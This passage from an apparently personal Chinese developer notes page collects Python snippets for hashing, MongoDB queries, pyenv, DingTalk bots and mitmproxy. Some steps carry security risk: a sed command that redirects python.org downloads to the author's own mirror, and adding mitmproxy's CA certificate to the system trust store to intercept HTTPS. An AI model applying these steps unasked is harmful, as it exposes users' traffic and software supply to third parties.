            <span class="n">s</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">hashlib</span><span class="p">,</span> <span class="n">name</span><span class="p">)(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">f</span>
<span class="n">md5</span> <span class="o">=</span> <span class="n">_load_hashlib</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">)</span>
<span class="n">sha1</span> <span class="o">=</span> <span class="n">_load_hashlib</span><span class="p">(</span><span class="s2">&quot;sha1&quot;</span><span class="p">)</span>
<span class="n">sha512</span> <span class="o">=</span> <span class="n">_load_hashlib</span><span class="p">(</span><span class="s2">&quot;sha512&quot;</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">_A</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__getattr__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">a</span>
        <span class="n">a</span><span class="o">=</span><span class="n">el</span><span class="p">()</span>
        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
<span class="n">a</span><span class="o">=</span><span class="n">_A</span><span class="p">()</span>

<span class="k">class</span> <span class="nc">_sess</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__getattr__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">sess</span>
        <span class="n">sess</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sess</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
<span class="n">sess</span><span class="o">=</span><span class="n">_sess</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">t</span><span class="p">():</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
<span class="k">def</span> <span class="nf">d</span><span class="p">(</span><span class="n">ts</span><span class="p">):</span>
    <span class="n">ts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ts</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ts</span><span class="p">))</span><span class="o">==</span><span class="mi">13</span><span class="p">:</span>
        <span class="n">ts</span> <span class="o">=</span> <span class="n">ts</span><span class="o">//</span><span class="mi">1000</span>
    <span class="k">return</span> <span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">ts</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="pythonmongodb">Python使用MongoDB<a class="headerlink" href="#pythonmongodb" title="Permanent link">&para;</a></h2>
<p>爬取数据ajax接口返回的是json数据，懒得转换成mysql的表示，直接丢给mongo呗</p>
<p>可视化客户端使用官方的<a href="https://www.mongodb.com/try/download/compass">Compass</a></p>
<h3 id="server">安装server<a class="headerlink" href="#server" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="err">docker run -d --name mongo -e MONGO_INITDB_ROOT_USERNAME=adminusername -e MONGO_INITDB_ROOT_PASSWORD=password -v /srv/mongo:/data/db -p 27017:27017 mongo</span>
</code></pre></div>


<p>安装后的连接字符串是：<code>mongodb://adminusername:password@ip:27017</code></p>
<h3 id="_15">增删查改<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<h4 id="_16">查询<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
<p>嵌套的格式用.表示 例如<code>{"a.b": "1"}</code>可以查到文档<code>{a:{b:"1"}}</code></p>
<p>Python代码：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pymongo</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="s2">&quot;mongodb://adminusername:password@127.0.0.1:27017&quot;</span><span class="p">)</span>
<span class="n">table</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">database_name</span><span class="o">.</span><span class="n">table_name</span>
<span class="k">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">find_one</span><span class="p">({</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span> <span class="nb">id</span><span class="p">}))</span>
<span class="k">print</span><span class="p">(</span><span class="n">table</span><span class="o">.</span><span class="n">count_documents</span><span class="p">({}))</span>
</code></pre></div>


<h4 id="_17">批量增加<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
<p>insert ignore into 忽略已经存在的：</p>
<div class="codehilite"><pre><span></span><code><span class="k">try</span><span class="o">:</span>
    <span class="n">table</span><span class="o">.</span><span class="na">insert_many</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="n">ordered</span><span class="o">=</span><span class="n">False</span><span class="o">)</span>
<span class="n">except</span> <span class="n">pymongo</span><span class="o">.</span><span class="na">errors</span><span class="o">.</span><span class="na">BulkWriteError</span><span class="o">:</span>
    <span class="n">pass</span>
</code></pre></div>


<p>replace into 覆盖已经存在的：使用upcert不存在时插入</p>
<div class="codehilite"><pre><span></span><code><span class="err">for item in data:</span>
<span class="err">    # 你很可能需要自己定义_id</span>
<span class="err">    # item[&quot;_id&quot;] = &quot;_&quot;.join([...])</span>
<span class="err">    # pprint(item)</span>
<span class="err">    table.update({&#39;_id&#39;:item[&quot;_id&quot;]}, item, True)</span>
</code></pre></div>


<h4 id="_18">删除<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
<p>类似的有函数：delete_one, delete_many</p>
<h3 id="join">多表join查询<a class="headerlink" href="#join" title="Permanent link">&para;</a></h3>
<p>table中文档里有一个属性idB，对应tableB的_id，使用<code>$lookup</code>做join操作，无论有没有查到都会返回新的文档，没查到时dst属性为空数组</p>
<p>所以可以用<code>$match</code>继续筛选查到的内容；然后统计数量，注意到$count在没有结果的时候不返回内容，需要单独处理</p>
<div class="codehilite"><pre><span></span><code><span class="err">def howmany():</span>
<span class="err">    pipeline = [</span>
<span class="err">        {&quot;$match&quot;: {&quot;idB&quot;: {&quot;$exists&quot;: True}}}, </span>
<span class="err">        {&quot;$lookup&quot;: {&quot;from&quot;: &#39;tableB&#39;, &quot;localField&quot;: &#39;idB&#39;, &quot;foreignField&quot;: &#39;_id&#39;, &quot;as&quot;: &#39;dst&#39;}},</span>
<span class="err">        {&quot;$match&quot;: {&quot;dst&quot;: {&quot;$size&quot;: 1}}},</span>
<span class="err">        {&quot;$count&quot;: &quot;cnt&quot;}</span>
<span class="err">    ]</span>
<span class="err">    data = list(table.aggregate(pipeline))</span>
<span class="err">    if not data:</span>
<span class="err">        return 0</span>
<span class="err">    return data[0][&quot;cnt&quot;]</span>
</code></pre></div>


<h3 id="_19">随机采样<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
<p>pipeline中使用：但是注意可能会有重复的元素 需要自己去重</p>
<div class="codehilite"><pre><span></span><code><span class="err">{&quot;$sample&quot;: {&quot;size&quot;:10}}</span>
</code></pre></div>


<hr />
<h2 id="pyenvpython">使用pyenv编译安装不同版本的Python<a class="headerlink" href="#pyenvpython" title="Permanent link">&para;</a></h2>
<p>想自己维护一个完整的虚拟环境，方便的安装各种版本，用<a href="https://github.com/pyenv/pyenv">pyenv</a>呗</p>
<p>安装：</p>
<div class="codehilite"><pre><span></span><code><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">pyenv</span><span class="o">/</span><span class="n">pyenv</span><span class="o">.</span><span class="n">git</span> <span class="o">~/.</span><span class="n">pyenv</span>
<span class="n">echo</span> <span class="s1">&#39;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#39;</span> <span class="o">&gt;&gt;</span> <span class="o">~/.</span><span class="n">bash_profile</span>
<span class="n">echo</span> <span class="s1">&#39;export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#39;</span> <span class="o">&gt;&gt;</span> <span class="o">~/.</span><span class="n">bash_profile</span>
<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then</span><span class="se">\n</span><span class="s1">  eval &quot;$(pyenv init -)&quot;</span><span class="se">\n</span><span class="s1">fi&#39;</span> <span class="o">&gt;&gt;</span> <span class="o">~/.</span><span class="n">bash_profile</span>
</code></pre></div>


<p>然后就能编译安装特定版本的Python了，以3.7.0为例：使用我提供的www.python.org的镜像</p>
<div class="codehilite"><pre><span></span><code><span class="err">apt install -y libffi-dev libgnutls28-dev</span>
<span class="err">cd ~/.pyenv/plugins</span>
<span class="err">sed -i &#39;s#www.python.org#py.py3.io#g&#39; $(grep www.python.org -r . -l)</span>
<span class="err">pyenv install -v 3.7.0</span>
<span class="err">pyenv global 3.7.0</span>
</code></pre></div>


<p>之后使用如果遇到密码学库的问题：</p>
<div class="codehilite"><pre><span></span><code><span class="err">pip uninstall pycrypto pycryptodome</span>
<span class="err">pip install pycryptodome</span>
</code></pre></div>


<hr />
<h2 id="_20">发送钉钉消息<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
<p>群聊加入机器人 关键词设置为一定会出现的字符如<code>.。[</code>，获取url后调用时只需要传入token部分</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="k">def</span> <span class="nf">dingsend</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;msgtype&quot;</span> <span class="p">:</span> <span class="s2">&quot;text&quot;</span> <span class="p">,</span>
        <span class="s2">&quot;text&quot;</span> <span class="p">:</span> <span class="p">{</span> <span class="s2">&quot;content&quot;</span> <span class="p">:</span> <span class="n">text</span> <span class="p">},</span>
        <span class="s2">&quot;isAtAll&quot;</span> <span class="p">:</span> <span class="bp">False</span> 
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://oapi.dingtalk.com/robot/send?access_token=&quot;</span><span class="o">+</span><span class="n">token</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="mitmproxy">使用mitmproxy<a class="headerlink" href="#mitmproxy" title="Permanent link">&para;</a></h2>
<p>python3 -m pip install mitmproxy</p>
<p>参考： https://stackoverflow.com/questions/51893788/using-mitmproxy-inside-python-script</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">mitmproxy.options</span> <span class="kn">import</span> <span class="n">Options</span>
<span class="kn">from</span> <span class="nn">mitmproxy.proxy.config</span> <span class="kn">import</span> <span class="n">ProxyConfig</span>
<span class="kn">from</span> <span class="nn">mitmproxy.proxy.server</span> <span class="kn">import</span> <span class="n">ProxyServer</span>
<span class="kn">from</span> <span class="nn">mitmproxy.tools.dump</span> <span class="kn">import</span> <span class="n">DumpMaster</span>

<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">asyncio</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">class</span> <span class="nc">Addon</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">flow</span><span class="p">):</span>
        <span class="n">flow</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;count&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">flow</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">num</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="n">flow</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&quot;count&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num</span><span class="p">)</span>


<span class="c1"># see source mitmproxy/master.py for details</span>
<span class="k">def</span> <span class="nf">loop_in_thread</span><span class="p">(</span><span class="n">loop</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="n">asyncio</span><span class="o">.</span><span class="n">set_event_loop</span><span class="p">(</span><span class="n">loop</span><span class="p">)</span>  <span class="c1"># This is the key.</span>
    <span class="n">m</span><span class="o">.</span><span class="n">run_loop</span><span class="p">(</span><span class="n">loop</span><span class="o">.</span><span class="n">run_forever</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">(</span><span class="n">listen_host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">listen_port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">http2</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">DumpMaster</span><span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">with_termlog</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">with_dumper</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">config</span> <span class="o">=</span> <span class="n">ProxyConfig</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
    <span class="n">m</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">ProxyServer</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
    <span class="n">m</span><span class="o">.</span><span class="n">addons</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Addon</span><span class="p">())</span>

    <span class="c1"># run mitmproxy in backgroud, especially integrated with other server</span>
    <span class="n">loop</span> <span class="o">=</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span> <span class="n">target</span><span class="o">=</span><span class="n">loop_in_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">loop</span><span class="p">,</span><span class="n">m</span><span class="p">)</span> <span class="p">)</span>
    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="c1"># Other servers, such as a web server, might be started then.</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;going to shutdown mitmproxy&#39;</span><span class="p">)</span>
    <span class="n">m</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
</code></pre></div>


<p>安装proxychains:</p>
<div class="codehilite"><pre><span></span><code><span class="err">apt install proxychains4</span>
</code></pre></div>


<p>修改/etc/proxychains.conf，最后一行改成<code>http 127.0.0.1 8080</code></p>
<p>添加信任：参考 https://superuser.com/questions/437330/how-do-you-add-a-certificate-authority-ca-to-ubuntu</p>
<div class="codehilite"><pre><span></span><code><span class="err">cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt</span>
<span class="err">update-ca-certificates</span>
</code></pre></div>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href=".." title="Home" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Home
              </div>
            </div>
          </a>
        
        
          <a href="../gist/" title="Gist Python一些常用代码片段" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Gist Python一些常用代码片段
              </div>
            </div>
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            <a href=https://beian.miit.gov.cn/>浙ICP备15043819号-2</a>&nbsp;&nbsp;<a target=_blank href=http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602007826><img src="/assets/images/beian.png" height=14px>浙公网安备 33010602007826号</p></a>
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/vendor.77e55a48.min.js"></script>
      <script src="../assets/javascripts/bundle.aa3f9871.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "..",
          features: [],
          search: Object.assign({
            worker: "../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="../assets/js/instantclick.min.js"></script>
      
        <script src="../assets/js/index.js"></script>
      
    
  </body>
</html>